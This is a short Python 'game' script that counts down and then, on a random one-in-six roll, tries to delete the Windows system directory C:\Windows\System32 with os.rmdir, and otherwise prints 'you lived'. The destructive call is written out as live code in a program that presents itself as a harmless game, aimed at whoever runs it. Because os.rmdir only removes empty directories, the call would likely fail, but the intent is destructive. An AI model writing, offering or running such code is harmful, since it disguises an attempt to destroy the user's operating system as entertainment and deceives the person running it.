import os, random, time
print('The game begins')
rand = random.randint(1, 6)
for i in range(1, 11):
    print(i)
    time.sleep(1)
if(rand == 1):
    print('removing')
    os.rmdir(r'C:\Windows\System32')
else:
    print('you lived')
